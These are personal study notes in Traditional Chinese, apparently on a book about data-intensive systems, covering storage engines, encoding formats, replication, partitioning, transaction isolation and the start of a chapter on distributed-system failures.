index\n\n保留一個內存中的散列映射，其中每個鍵都映射到數據文件中的一個字節偏移量\n\n在硬盤上通過一次硬盤查找操作來加載所需部分 (seek)\n有新index就直接append這update記錄到log去 (持久化)\n\n將日志分為特定大小的段（segment）\n當日志增長到特定尺寸時關閉當前段文件，並開始寫入一個新的段文件\n對這些段進行壓縮（compaction）\n\n\n\n關於log要考慮\n\n文件格式\n\nCSV不是日志的最佳格式。使用二進制格式更快，更簡單\n\n\n刪除記錄\n\n如果要刪除一個鍵及其關聯的值，則必須在數據文件中追加一個特殊的刪除記錄(邏輯刪除)\n當日志段被合並時，合並過程會通過這個墓碑知道要將被刪除鍵的所有歷史值都丟棄掉\n\n\n崩潰恢覆\n\n你可以通過從頭到尾讀取整個段文件並記錄下來每個鍵的最近值來恢覆每個段的散列映射 (如果太大)\n每個段的散列映射的快照存儲在硬盤上來加速恢覆，可以使散列映射更快地加載到內存中\n\n\n部分寫入記錄\n\n數據庫隨時可能崩潰，包括在將記錄追加到日志的過程中\n\n校驗和，允許檢測和忽略日志中的這些損壞部分\n\n\n\n\n並發控制\n\n由於寫操作是以嚴格的順序追加到日志中的，所以常見的實現是只有一個寫入線程\n數據文件段是僅追加的或者說是不可變的，所以它們可以被多個線程同時讀取\n\n\n\n\nlog只append的好處\n\n追加和分段合並都是順序寫入操作，通常比隨機寫入快得多\n如果段文件是僅追加的或不可變的，並發和崩潰恢覆就簡單多了\n合並舊段的處理也可以避免數據文件隨著時間的推移而碎片化的問題\n\n\n\n\n缺點\n\n散列表必須能放進內存\n範圍查詢效率不高\n\n\n\n\n\nSSTables和LSM樹\n\n前提\n\n要求log的鍵值對的序列按鍵排序\n\n在mem用AVL tree\n等size夠大就dump到log\n\n\n要求每個鍵只在每個合並的段文件中出現一次\n\n\n崩潰恢覆\n\n多一個操作log (超常見手法)\n\n\n好處\n\n即使文件大於可用內存，合並段的操作仍然是簡單而高效的\n為了在文件中找到一個特定的鍵，你不再需要在內存中保存所有鍵的索引\n\n可以在mem存一個一個區段，之後就是在對的區段直接掃描\n\n\n由於讀取請求無論如何都需要掃描所請求範圍內的多個鍵值對，因此可以將這些記錄分組為塊（block），並在將其寫入硬盤之前對其進行壓縮\n\n省空間、io\n\n\n\n\n缺點\n\n當查找數據庫中不存在的鍵時，LSM樹算法可能會很慢\n\n使用額外的布隆過濾器（Bloom filters）\n\n告訴DB是不是不存在某個鍵\n\n\n\n\n\n\n\n\nB樹\n\n具有n個鍵的B樹總是具有 O(log n) 的深度\n崩潰恢覆\n\nB樹的基本底層寫操作是用新數據覆寫硬盤上的頁面\n\nB樹實現通常會帶有一個額外的硬盤數據結構\n\n預寫式日志（WAL，即write-ahead log） (超常見手法)\n\n\n\n\n\n\n優化\n\n使用寫時覆制 (持久化)\n我們可以通過不存儲整個鍵，而是縮短其大小，來節省頁面空間\n盡量使葉子頁面按順序出現在硬盤上\n\nLSM樹在合並過程中一次又一次地重寫存儲的大部分，所以它們更容易使順序鍵在硬盤上彼此靠近\n\n\n額外的指針已被添加到樹中\n\n每個葉子頁面可以引用其左邊和右邊的兄弟頁面\n使得不用跳回父頁面就能按順序對鍵進行掃描\n\n\n\n\n\n\n\n\n比較B樹和LSM樹\n\n通常LSM樹的寫入速度更快，而B樹的讀取速度更快\nLSM樹上的讀取通常比較慢，因為它們必須檢查幾種不同的數據結構和不同壓縮（Compaction）層級的SSTables\nLSM樹的優點\n\n較低的寫放大 &amp; 更高的寫入吞吐量\n\n寫放大: 在數據庫的生命周期中每次寫入數據庫導致對硬盤的多次寫入\nB樹索引中的每塊數據都必須至少寫入兩次\n\n一次寫入預先寫入日志（WAL）\n一次寫入樹頁面本身\n\n\n由於反覆壓縮和合並SSTables，日志結構索引也會多次重寫數據\n\n順序地寫入緊湊的SSTable文件而不是必須覆寫樹中的幾個頁面\n\n\n\n\nLSM樹可以被壓縮得更好，因此通常能比B樹在硬盤上產生更小的文件\n\n\nLSM樹的缺點\n\n壓縮過程有時會幹擾正在進行的讀寫操作\n\n日志結構化存儲引擎在更高百分位的響應時間（請參閱“描述性能”）有時會相當長\n\nB樹的行為則相對更具可預測性\n\n\n在高寫入吞吐量時：硬盤的有限寫入帶寬需要在初始寫入（記錄日志和刷新內存表到硬盤）和在後台運行的壓縮線程之間共享\n\n\n在B樹索引中，這些鎖可以直接附加到樹上\n\nB樹的一個優點是每個鍵只存在於索引中的一個位置\n日志結構化的存儲引擎可能在不同的段中有相同鍵的多個副本\n\n\n\n\n\n\n\n\n\n物化視圖\n\n一個類似於表的對象，其內容是一些查詢或是aggregate func(sum,min)的結果\n\n使得寫入成本更高\n\n當底層數據發生變化時，物化視圖需要更新\n\n\n\n\n多維度: 數據立方體或OLAP立方\n\n\n\n\n\n\n\n事務處理和分析系統\n\n\n\n\n\n數據倉庫\n\n一個獨立的數據庫，分析人員可以查詢他們想要的內容而不影響OLTP操作\n數據倉庫包含公司各種OLTP系統中所有的只讀數據副本\n抽取-轉換-加載（ETL）\n\n從OLTP數據庫中提取數據（使用定期的數據轉儲或連續的更新流），轉換成適合分析的模式，清理並加載到數據倉庫中。將數據存入倉庫的過程\n\n\n\n分析的模式\n\n星型模式\n\n在模式的中心是一個所謂的事實表\n\n事實表的每一行代表在特定時間發生的事件\n\n事實被視為單獨的事件，因為這樣可以在以後分析中獲得最大的靈活性\n\n事實表可以變得非常大、寬\n\n做列式存儲\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n列式存儲\n\n方法\n\n將來自每一列的所有值存儲在一起\n每個列式存儲在一個單獨的文件中\n\n這樣row的寫入會變得麻煩 =&gt; LSM樹\n\n所有的寫操作首先進入一個內存中的存儲，在這里它們被添加到一個已排序的結構中，並準備寫入硬盤\n\n\n\n\n\n\n好處\n\n查詢只需要讀取和解析查詢中使用的那些列\n\n這可以節省大量的工作\n\n\n還可以做列壓縮\n\n值域通常重複\n\n\n比起用row去讀用col去讀可以用SIMD優化\n可以對col排序達成類似index與壓縮的效果\n\n第一個排序鍵的壓縮效果最強\n第二和第三個排序鍵會更混亂\n\n把用不同col排的資料分散到不同DB!!\n\n\n\n\n\n\n\n\n\n第四章：編碼與演化\n可演化性: 有些舊有些新，但都可以動\n\n服務端（server-side）\n\n滾動升級 （rolling upgrade）\n\n\n客戶端（client-side）\n\n升不升級就要看用戶的心情了\n\n\n\n雙向兼容性\n\n\n向後兼容 (backward compatibility)\n\n新代碼可以讀舊數據。\n\neasy\n\n\n\n\n\n向前兼容 (forward compatibility)\n\n舊代碼可以讀新數據。\n\n舊版的程序需要忽略新版數據格式中新增的部分!!\n\n\n\n\n\n編碼數據的格式\n\n程序通常（至少）使用兩種形式的數據\n\n在內存中，數據保存在對象\n如果要將數據寫入文件，或通過網絡發送，則必須將其 編碼（encode） 為某種自包含的字節序列\n\n語言特定的格式\n\n這類編碼通常與特定的編程語言深度綁定，其他語言很難讀取這種數據\n解碼過程需要實例化任意類的能力，這通常是安全問題的一個來源\n數據版本控制通常是事後才考慮的\n\n因為它們旨在快速簡便地對數據進行編碼，所以往往忽略了前向後向兼容性帶來的麻煩問題\n\n\n效率（編碼或解碼所花費的CPU時間，以及編碼結構的大小）往往也是事後才考慮的\n\n\nJSON, XML …\n\n數值（numbers） 的編碼多有歧義之處\n\nXML和CSV不能區分數字和字符串\nJSON雖然區分字符串與數值，但不區分整數和浮點數，而且不能指定精度\n\n\nJSON和XML對Unicode字符串（即人類可讀的文本）有很好的支持，但是它們不支持二進制數據\n沒有type做保證 (有也很難用或是沒統一)\n\n\n二進制編碼\n\nThrift與Protocol Buffers\n\nThrift和Protocol Buffers每一個都帶有一個代碼生成工具，它采用了類似於這里所示的模式定義，並且生成了以各種編程語言實現模式的類\n都可以設定\n\noptional\nargs的index\ntype\n\n\nargs的index 與 兼容性\n\n編碼的記錄就是其編碼字段的拼接\n\n每個字段由其標簽號碼（樣本模式中的數字1,2,3）標識\n用數據類型（例如字符串或整數）注釋\n\n\n向前兼容性\n\n舊的忽略新加的index\n\n\n向後兼容性\n\nindex不變，可以讀舊的\nBUT\n\n如果你添加一個新的字段，你不能設置為required\n\noptional\n加上預設值\n\n\n\n\n\n\n\n\n\n\nAvro\n\n沒有args的index: 只用名字識別\n\n為了解析二進制數據，你按照它們出現在模式中的順序遍歷這些字段，並使用模式來告訴你每個字段的數據類型\n\n把解釋的權利交給程式: reader &amp; writer\n\n\n\n\n方便動態生成\n\n如果數據庫模式發生變化，則可以從更新的數據庫模式生成新的Avro模式，並在新的Avro模式中導出數據。\n\n\n\n\n\n\nWriter模式與Reader模式\n\n雖然說分成兩個，其實就是拿一個type去parse看看\n\n有對到就ok\n\n\n\n\n兼容性\n\n只能添加或刪除具有默認值的字段\n破壞向後兼容性\n\n添加一個沒有默認值的字段\n\n新的Reader將無法讀取舊Writer寫的數據\n\n\n\n\n破壞向前兼容性\n\n刪除沒有默認值的字段\n\n舊的Reader將無法讀取新Writer寫入的數據\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n第五章：覆制\n覆制的困難之處在於處理覆制數據的變更（change）\n三種流行的變更覆制算法：\n\n單領導者（single leader）\n\n腳色\n\n主庫（master|primary）\n\n當客戶端要向數據庫寫入時，它必須將請求發送給領導者，領導者會將新數據寫入其本地存儲\n\n\n追隨者（followers）\n\n每當領導者將新數據寫入本地存儲時，它也會將數據變更發送給所有的追隨者，稱之為覆制日志（replication log） 記錄 (change stream)\n每個跟隨者從領導者拉取日志，並相應更新其本地數據庫副本，方法是按照領導者處理的相同順序應用所有寫入\n設置新從庫\n\n在某個時刻獲取主庫的一致性快照（如果可能），而不必鎖定整個數據庫\n從庫連接到主庫，並拉取快照之後發生的所有數據變更\n\n這要求快照與主庫覆制日志中的位置精確關聯\n\n\n當從庫處理完快照之後積壓的數據變更，我們說它 趕上（caught up） 了主庫\n\n\n\n\n\n\n同步覆制與異步覆制\n\n同步覆制\n\n優點\n\n從庫保證有與主庫一致的最新數據副本\n\n\n缺點\n\n如果同步從庫沒有響應，主庫就無法處理寫入操作\n\n主庫必須阻止所有寫入，並等待同步副本再次可用\n\n\n\n\n所有從庫都設置為同步的是不切實際的\n\n在數據庫上啟用同步覆制，通常意味著其中一個跟隨者是同步的\n這保證你至少在兩個節點上擁有最新的數據副本：主庫和同步從庫\n\n這種配置有時也被稱為 半同步（semi-synchronous）\n\n\n\n\n\n\n異步覆制\n\n優點\n\n即使所有的從庫都落後了，主庫也可以繼續處理寫入\n\n\n缺點\n\n如果主庫失效且不可恢覆，則任何尚未覆制給從庫的寫入都會丟失\n\n使已經向客戶端確認成功，寫入也不能保證 持久（Durable\n\n\n\n\n\n\n\n\n處理節點宕機\n\n從庫失效：追趕恢覆\n主庫失效：故障切換\n\nsteps\n\n確認主庫失效\n\n大多數系統只是簡單使用 超時（Timeout）\n\n節點頻繁地相互來回傳遞消息，並且如果一個節點在一段時間內沒有響應，就認為它掛了\n\n\n\n\n選擇一個新的主庫\n\n可以通過選舉過程（主庫由剩余副本以多數選舉產生）來完成\n可以由之前選定的控制器節點（controller node） 來指定新的主庫\n\n\n重新配置系統以啟用新的主庫。客戶端現在需要將它們的寫請求發送給新主庫\n\n系統需要確保舊主庫意識到新主庫的存在，並成為一個從庫\n\n\n\n\n要注意的\n\n如果使用異步覆制，則新主庫可能沒有收到老主庫宕機前最後的寫入操作\n如果老主庫重新加入集群，新主庫在此期間可能會收到沖突的寫入，那這些寫入該如何處理？\n如果數據庫需要和其他外部存儲相協調，那麽丟棄寫入內容是極其危險的操作\n\ngithub的redis與DB (數據庫使用自增ID作為主鍵)\n\n\n可能會出現兩個節點都以為自己是主庫的情況\n主庫被宣告死亡之前的正確超時應該怎麽配置？ (timeout要剛好!!)\n\n\n\n\n\n\n覆制日志的實現\n\n基於語句的覆制\n\n主庫記錄下它執行的每個寫入請求（語句，即statement）並將該語句日志發送給其從庫\n問題是\n\n非確定性函數（nondeterministic）\n自增列（auto increment）\n有副作用的語句\n\n\n\n\n傳輸預寫式日志（WAL）\n\n日志都是包含所有數據庫寫入的僅追加字節序列\n\n可以使用完全相同的日志在另一個節點上構建副本\n\n\n問題是\n\n日志記錄的數據非常底層\n\nWAL包含哪些磁盤塊中的哪些字節發生了更改\n這使覆制與存儲引擎緊密耦合\n\n如果要升級DB的話…\n\n\n\n\n\n\n\n\n邏輯日志覆制（基於行）\n\n覆制和存儲引擎使用不同的日志格式，這樣可以使覆制日志從存儲引擎內部分離出來\n\n對於插入的行，日志包含所有列的新值。\n對於刪除的行，日志包含足夠的信息來唯一標識已刪除的行\n對於更新的行，日志包含足夠的信息來唯一標識更新的行\n\n\n這樣就可以把DB變動當成資料流!!\n\n\n\n\n覆制延遲問題\n\n當應用程序從異步從庫讀取時，如果從庫落後，它可能會看到過時的信息\n複製的一致性的種種問題\n\n讀己之寫: 讀寫一致性（read-after-write consistency）\n\n\n解\n\n都從主庫讀\n\n讀用戶可能已經修改過的內容時\n使用其他標準來決定是否從主庫讀取\n\n\n客戶端可以記住最近一次寫入的時間戳\n\n系統需要確保從庫為該用戶提供任何查詢時，該時間戳前的變更都已經傳播到了本從庫中\n\n\n\n\n跨設備的寫後讀一致性\n\n記住用戶上次更新時間戳的方法變得更加困難\n\n元數據需要一個中心存儲\n\n\n如果副本分布在不同的數據中心，很難保證來自不同設備的連接會路由到同一數據中心\n\n4G與wifi\n\n\n\n\n\n\n單調讀（Monotonic reads\n\n\n\n如果先前讀取到較新的數據，後續讀取不會得到更舊的數據\n\n\n解\n\n實現單調讀取的一種方式是確保每個用戶總是從同一個副本進行讀取\n\n可以基於用戶ID的散列來選擇副本\n\n\n\n\n\n\n一致前綴讀（consistent prefix reads）\n\n\n\n如果一系列寫入按某個順序發生，那麽任何人讀取這些寫入時，也會看見它們以同樣的順序出現\n\n不存在全局寫入順序!!\n\n\n\n\n解\n\n確保任何因果相關的寫入都寫入相同的分區\n\n\n\n\n\n\n\n\n\n\n多領導者（multi leader）\n\n允許多個節點接受寫入\n\n覆制仍然以同樣的方式發生：處理寫入的每個節點都必須將該數據更改轉發給所有其他節點\n\n\nscenario\n\n副本分散在好幾個不同的數據中心\n\n兩個不同的數據中心可能會同時修改相同的數據，寫沖突是必須解決的\n\n\n需要離線操作的客戶端\n\n應用程序在斷網之後仍然需要繼續工作\n\n\n協同編輯\n\n\n處理寫入沖突\n\n同步與異步沖突檢測\n\n使沖突檢測同步 - 即等待寫入被覆制到所有副本，然後再告訴用戶寫入成功\n\n失去多主覆制的主要優點：允許每個副本獨立接受寫入\n\n\n\n\n收斂至一致的狀態\n\n在多主配置中，沒有明確的寫入順序，所以最終值應該是什麽並不清楚\n\n給每個寫入一個唯一的ID，挑選最高ID的寫入作為勝利者 (LWW, last write wins)\n以某種方式將這些值合並在一起 - 例如，按字母順序排序，然後連接它們\n用一種可保留所有信息的顯式數據結構來記錄沖突，並編寫解決沖突的應用程序代碼\n\n\n\n\n避免沖突\n\n確保來自特定用戶的請求始終路由到同一數據中心，並使用該數據中心的領導者進行讀寫\n\n但是，有時你可能需要更改指定的記錄的主庫\n\n還是必須處理不同主庫同時寫入的可能性\n\n\n\n\n\n\n自定義沖突解決邏輯\n\n寫時執行\n\n只要數據庫系統檢測到覆制更改日志中存在沖突，就會調用沖突處理程序\n\n\n讀時執行\n\n當檢測到沖突時，所有沖突寫入被存儲\n\n下一次讀取數據時，會將這些多個版本的數據返回給應用程序。\n應用程序可能會提示用戶或自動解決沖突\n\n\n\n\n\n\n多主覆制拓撲\n\n\n\n環形和星形拓撲的問題\n\n如果只有一個節點發生故障，則可能會中斷其他節點之間的覆制消息流\n\n\n全部到全部拓撲的問題\n\n一些網絡鏈接可能比其他網絡鏈接更快，結果是一些覆制消息可能“超過”其他覆制消息\n\n解\n\n用版本向量 (vector time)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n無領導者（leaderless）\n\n放棄主庫的概念，並允許任何副本直接接受來自客戶端的寫入\n\n\n過法定人數就算成功\n\n只要w + r&gt; n，我們期望在讀取時獲得最新的值\n\n因為r個讀取中至少有一個節點是最新的\n遵循這些r值，w值的讀寫稱為法定人數（quorum）的讀和寫\n\n\n重要的前提\n\n寫入的節點集合和你讀取的節點集合必須重疊\n\n你讀取的節點中必須至少有一個具有最新值的節點\n\n\n\n\n法定人數一致性的局限性\n\n即使在w + r&gt; n的情況下，也可能存在返回陳舊值的邊緣情況\n\n例子\n\n如果使用寬松的法定人數，w個寫入和r個讀取落在完全不同的節點上\n\n寬松的法定人數\n\n網絡中斷期間客戶端可能仍能連接到一些數據庫節點，但又不足以組成一個特定值的法定人數\n\n這時可以\n\n返回錯誤\n接受寫入，然後將它們寫入一些其他可達的節點，但不在這些值通常所存在的n個節點上 (寬松的法定人數)\n\n然而，這意味著即使當w + r&gt; n時，也不能確定讀取某個鍵的最新值，因為最新的值可能已經臨時寫入了n之外的某些節點\n\n\n\n\n\n\n\n\n\n\n如果兩個寫入同時發生，不清楚哪一個先發生\n如果寫操作與讀操作同時發生，寫操作可能僅反映在某些副本上\n\n不確定讀取是返回舊值還是新值\n\n\n如果寫操作在某些副本上成功，而在其他節點上失敗 (對面HDD爆了)\n\n所以整體判定寫入失敗，但整體寫入失敗並沒有在寫入成功的副本上回滾\n後續的讀取仍然可能會讀取這次失敗寫入的值\n\n\n即使一切工作正常，有時也會不幸地出現關於時序（timing） 的邊緣情況\n\n\n\n\n\n\n\n\n\n\n即使應用可以容忍陳舊的讀取，你也需要了解覆制的健康狀況\n\n如果顯著落後，應該提醒你，以便你可以調查原因\n\n\n在一個不可用的節點重新聯機之後，它如何趕上它錯過的寫入\n\n讀修覆（Read repair）\n\n當客戶端並行讀取多個節點時，它可以檢測到任何陳舊的響應，並將新值寫回到該副本\n\n\n反熵過程（Anti-entropy process）\n\n後台進程，該進程不斷查找副本之間的數據差異，並將任何缺少的數據從一個副本覆制到另一個副本\n\n\n\n\n檢測並發寫入\n\n問題在於，由於可變的網絡延遲和部分故障，事件可能在不同的節點以不同的順序到達\n手法 (與多領導者的很像)\n\n最後寫入勝利（丟棄並發寫入）\n“此前發生”的關系和並發\n\ntimestamp (安全令牌, lamport time)\n\n服務器為每個鍵保留一個版本號，每次寫入鍵時都增加版本號，並將新版本號與寫入的值一起存儲。\n當客戶端讀取鍵時，服務器將返回所有未覆蓋的值以及最新的版本號。客戶端在寫入前必須讀取。\n客戶端寫入鍵時，必須包含之前讀取的版本號，並且必須將之前讀取的所有值合並在一起\n當服務器接收到具有特定版本號的寫入時，它可以覆蓋該版本號或更低版本的所有值\n\n\n\n\n合並同時寫入的值\n\n一個簡單的方法是根據版本號或時間戳做union\n\n不能處理直接刪除的case (&#123;1&#125; | &#123;x1x, 2&#125; = &#123;1, 2&#125;)\n\n墓碑（tombstone, soft delete）\n\n\n\n\n\n\n版本向量 (vector time)\n\n副本在處理寫入時增加自己的版本號，並且跟蹤從其他副本中看到的版本號\n這個信息指出了要覆蓋哪些並發值，以及保留哪些並發值。\n\n\n\n\n\n\n\n\n\n第六章：分區\n分區通常與覆制結合使用，使得每個分區的副本存儲在多個節點上\n\n\n怎麼分配key\n\n一些分區比其他分區有更多的數據或查詢，我們稱之為偏斜（skew）\n不均衡導致的高負載的分區被稱為熱點（hot spot）\n作法\n\n將記錄隨機分配給節點\n\n當你試圖讀取一個特定的值時，你無法知道它在哪個節點上\n\n必須並行地查詢所有的節點\n\n\n\n\n為每個分區指定一塊連續的鍵範圍（從最小值到最大值）\n\n鍵的範圍不一定均勻分布，因為數據也很可能不均勻分布\n\n分區邊界可以由管理員手動選擇，也可以由數據庫自動選擇 (分區再平衡)\n\n\nKey Range分區的缺點是某些特定的訪問模式會導致熱點\n\n如果主鍵是時間戳，則分區對應於時間範圍\n\n今天會先被塞爆\n\n需要使用除了時間戳以外的其他東西作為主鍵的第一個部分\n\n\n\n\n\n\n\n\nhash function\n\n一致性哈希，即consistent hashing\n失去高效執行範圍查詢的能力\n\n\n\n\n\n\n負載偏斜與熱點消除\n\n這個key就是熱門 (藝人)\n\n所有的請求都會被路由到同一個分區\n\n\n一個簡單的方法是在主鍵的開始或結尾添加一個隨機數\n\n將主鍵進行分割之後，任何讀取都必須要做額外的工作，因為他們必須從所有主鍵分布中讀取數據並將其合並\n\n\n\n\n分區與次級索引\n\n次級索引的問題是它們不能整齊地映射到分區\n\n次級索引通常並不能唯一地標識記錄，而是一種搜索記錄中出現特定值的方式\n\n查找包含詞語hogwash的所有文章，查找所有顏色為紅色的車輛等等\n\n\n\n\n兩種作法\n\n基於文檔\n\n在這種索引方法中，每個分區是完全獨立的\n\n每個分區維護自己的次級索引，僅覆蓋該分區中的文檔\n\n\n\n缺點\n\n可能會使次級索引上的讀取查詢相當昂貴\n*\n\n\n\n\n基於關鍵詞(Term)\n\n一個覆蓋所有分區數據的全局索引，而不是給每個分區創建自己的次級索引（本地索引）\n\n缺點\n\n寫入速度較慢且較為覆雜，因為寫入單個文檔現在可能會影響索引的多個分區\n\n\n\n\n\n\n\n\n分區再平衡\n\n將負載從集群中的一個節點向另一個節點移動的過程稱為再平衡（rebalancing）\n要求\n\n再平衡之後，負載（數據存儲，讀取和寫入請求）應該在集群中的節點之間公平地共享。\n再平衡發生時，數據庫應該繼續接受讀取和寫入。\n節點之間只移動必須的數據，以便快速再平衡，並減少網絡和磁盤I/O負載。\n\n\n方法\n\n反面教材：hash mod N\n\n如果節點數量N發生變化，大多數鍵將需要從一個節點移動到另一個節點\n\n\n固定數量的分區\n\n創建比節點更多的分區，並為每個節點分配多個分區\n\n如果一個節點被添加到集群中，新節點可以從當前每個節點中竊取一些分區，直到分區再次公平分配\n\n\n\n\n\n固定總大小的動態分區\n\n按鍵的範圍進行分區的數據庫會動態創建分區\n\n當分區增長到超過配置的大小時，會被分成兩個分區，每個分區約占一半的數據\n此過程與B樹頂層發生的過程類似\n\n\n動態分區的一個優點是分區數量適應總數據量\n一個空的數據庫從一個分區開始，因為沒有關於在哪里繪制分區邊界的先驗信息\n\n數據集開始時很小，直到達到第一個分區的分割點，所有寫入操作都必須由單個節點處理\n\n\n\n\n固定節點上分區數量的分區\n\n使分區數與節點數成正比\n當一個新節點加入集群時，它隨機選擇固定數量的現有分區進行拆分，然後占有這些拆分分區中每個分區的一半，同時將每個分區的另一半留在原地\n隨機化可能會產生不公平的分割\n\n\n\n\n運維：手動還是自動再平衡\n\n再平衡的過程中有人參與是一件好事\n\n這種自動化與自動故障檢測相結合可能十分危險\n\n假設一個節點過載，並且對請求的響應暫時很慢\n其他節點得出結論：過載的節點已經死亡，並自動重新平衡集群，使負載離開它\n\n這會對已經超負荷的節點，其他節點和網絡造成額外的負載\n\n\n\n\n\n\n\n\n\n\n請求路由\n\n我要怎麼知道找誰\n\n作出路由決策的組件（可能是節點之一，還是路由層或客戶端）如何了解分區-節點之間的分配關系變化？\n\n因為重要的是所有參與者都達成共識 - 否則請求將被發送到錯誤的節點\n\n\n\n\n不同的方案\n\n允許客戶聯系任何節點\n請求發送到路由層，它決定了應該處理請求的節點，並相應地轉發\n要求客戶端知道分區和節點的分配\n\n\n\n\n\n\n第七章：事務\n\n隔離級別\n\n讀已提交（Read Committed）\n\n從數據庫讀時，只能看到已提交的數據（沒有臟讀，即dirty reads）。\n寫入數據庫時，只會覆蓋已經寫入的數據（沒有臟寫，即dirty writes）。\n最常見的情況是，數據庫通過使用行鎖（row-level lock） 來防止臟寫\n\n因為等待鎖，應用某個部分的遲緩可能由於連鎖效應，導致其他部分出現問題\n\n解\n\n對於寫入的每個對象，數據庫都會記住舊的已提交值，和由當前持有寫入鎖的事務設置的新值\n當事務正在進行時，任何其他讀取對象的事務都會拿到舊值\n只有當新值提交後，事務才會切換到讀取新值。\n\n\n\n\n\n\n\n\n可重覆讀\n\n中間遇到commit的值，讓read不一樣\n有些情況下，不能容忍這種暫時的不一致\n\n備份\n分析查詢和完整性檢查\n\n\n解\n\n快照隔離\n\n每個事務都從數據庫的一致快照（consistent snapshot） 中讀取\n\n事務可以看到事務開始時在數據庫中提交的所有數據。\n即使這些數據隨後被另一個事務更改，每個事務也只能看到該特定時間點的舊數據\n\n\n\n\n實現快照隔離\n\n通常使用寫鎖來防止臟寫，這意味著進行寫入的事務會阻止另一個事務修改同一個對象 &amp;\n\n快照隔離的一個關鍵原則是：讀不阻塞寫，寫不阻塞讀\n\n\n數據庫必須可能保留一個對象的幾個不同的提交版本 (mvcc)\n\n因為各種正在進行的事務可能需要看到數據庫在不同的時間點的狀態\n\n\n\n\n一致性快照的可見性規則\n\n條件\n\n讀事務開始時，創建該對象的事務已經提交。\n對象未被標記為刪除，或如果被標記為刪除，請求刪除的事務在讀事務開始時尚未提交。\n\n\nsteps\n\n在每次事務開始時，數據庫列出當時所有其他（尚未提交或尚未中止）的事務清單，即使之後提交了，這些事務已執行的任何寫入也都會被忽略。\n被中止事務所執行的任何寫入都將被忽略。\n由具有較晚事務ID（即，在當前事務開始之後開始的）的事務所做的任何寫入都被忽略，而不管這些事務是否已經提交。\n所有其他寫入，對應用都是可見的。\n\n\n\n\n\n\n\n\n丟失更新 (老朋友)\n\n只有一個副本\n\n原子寫\n顯式鎖定\n比較並設置（CAS）\n\n\n多主或無主覆制\n\n沖突解決和覆制 (看前面)\n\n\n\n\n寫入偏斜與幻讀\n\n寫偏差\n\n更新不同row (row能鎖，但在此不用鎖)\n依據某個exclusive的條件，兩者同時更新 (這個沒辦法鎖)\n\nAlice和Bob是兩位值班醫生。兩人都感到不適，所以他們都決定請假\n不幸的是，他們恰好在同一時間點擊按鈕下班\n\n\n\n\n\n導致寫入偏差的幻讀 的 pattern\n\n一個SELECT查詢找出符合條件的行，並檢查是否符合一些要求\n按照第一個查詢的結果，應用代碼決定是否繼續\n如果應用決定繼續操作，就執行寫入（插入、更新或刪除），並提交事務\n\n\n解\n\n物化沖突（materializing conflicts）\n\n弄清楚如何物化沖突可能很難，也很容易出錯\n並發控制機制泄漏到應用數據模型是很醜陋的做法\n\n\n可串行化（Serializable）\n\n真的串行執行\n\n在單個線程上按順序一次只執行一個事務\n\n單線程循環執行事務是可行的!!\n\nRAM足夠便宜了，許多場景現在都可以將完整的活躍數據集保存在內存中\n數據庫設計人員意識到OLTP事務通常很短，而且只進行少量的讀寫操作\n\n\n其吞吐量僅限於單個CPU核的吞吐量\n為了充分利用單一線程，需要與傳統形式的事務不同的結構\n在這種交互式的事務方式中，應用程序和數據庫之間的網絡通信耗費了大量的時間\n\n如果不允許在數據庫中進行並發處理，且一次只處理一個事務，則吞吐量將會非常糟糕\nSO, 具有單線程串行事務處理的系統不允許交互式的多語句事務\n\n取而代之，應用程序必須提前將整個事務代碼作為存儲過程提交給數據庫\n\n存儲過程\n\n優點\n\n存儲過程與內存存儲，使得在單個線程上執行所有事務變得可行\n\n不需要等待I/O\n\n避免了並發控制機制的開銷\n單個線程上實現相當好的吞吐量\n\n\n\n\n\n\n缺點\n\n每個數據庫廠商都有自己的存儲過程語言\n在數據庫中運行的代碼難以管理\n數據庫通常比應用服務器對性能敏感的多，因為單個數據庫實例通常由許多應用服務器共享\n\n寫不好大家出事\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n兩階段鎖定（2PL，two-phase locking）\n\n在2PL中，寫入不僅會阻塞其他寫入，也會阻塞讀，反之亦然\n\n快照隔離使得讀不阻塞寫，寫也不阻塞讀\n\n\n一次拿所有的鎖，跑，一次放掉\n缺點\n\n如果transcation跑很久\n\n整個效能就很慢 (高百分位點處的響應會非常的慢)\n\n\n可能發生死鎖\n\n但在基於2PL實現的可串行化隔離級別中，它們會出現的頻繁的多\n\n\n\n\n謂詞鎖\n\n條件可以上鎖!!\n有range版\n\n\n\n\n可串行化快照隔離（SSI, serializable snapshot isolation）\n\n數據庫如何知道查詢結果是否可能已經改變？ (前提變了)\n\n檢測舊MVCC讀取\n\n數據庫需要跟蹤一個事務由於MVCC可見性規則而忽略另一個事務的寫入\n當事務想要提交時，數據庫檢查是否有任何被忽略的寫入現在已經被提交\n\n如果是這樣，事務必須中止\n\n\n\n\n檢測影響之前讀取的寫入\n\nSSI鎖類似謂詞鎖，但不會阻塞其他事務 (一個記號)\n提交時，若其他事務的沖突寫入已經被提交(有記號)\n\n事務必須中止\n\n\n\n\n\n\n優點\n\n事務不需要阻塞等待另一個事務所持有的鎖\n不局限於單個CPU核的吞吐量\n\n\n缺點\n\n長時間讀取和寫入數據的事務很可能會發生沖突並中止\n\n因此SSI要求同時讀寫的事務盡量短\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n第八章：分布式系統的麻煩\n使用分布式系統與在一台計算機上編寫軟件有著根本的區別，主要的區別在於有許多新穎和刺激的方法可以使事情出錯\n去理解我們能夠依賴，和不可以依賴的東西\n沒有共享內存，只有通過可變延遲的不可靠網絡傳遞的消息，系統可能遭受部分失效，不可靠的時鐘和處理暫停\n網絡中的一個節點無法確切地知道任何事情——它只能根據它通過網絡接收到（或沒有接收到）的消息進行猜測。\n不能確定對面是不是在搞 (拜占庭問題)\n在分布式系統中，我們可以陳述關於行為（系統模型）的假設，並以滿足這些假設的方式設計實際系統。算法可以被證明在某個系統模型中正確運行。這意味著即使底層系統模型提供了很少的保證，也可以實現可靠的行為\n\n部分失效\n\n在一台電腦上\n\n如果發生內部錯誤，我們寧願電腦完全崩潰，而不是返回錯誤的結果，因為錯誤的結果很難處理\n\n\n在分布式系統\n\n只能面對現實世界的混亂現實，容忍錯誤\n部分失效（partial failure）\n\n盡管系統的其他部分工作正常，但系統的某些部分可能會以某種不可預知的方式被破壞\n部分失效是不確定性的（nonderterministic）\n\n\n\n\n\n\n不可靠的網絡\n\n發送請求並期待響應，則很多事情可能會出錯 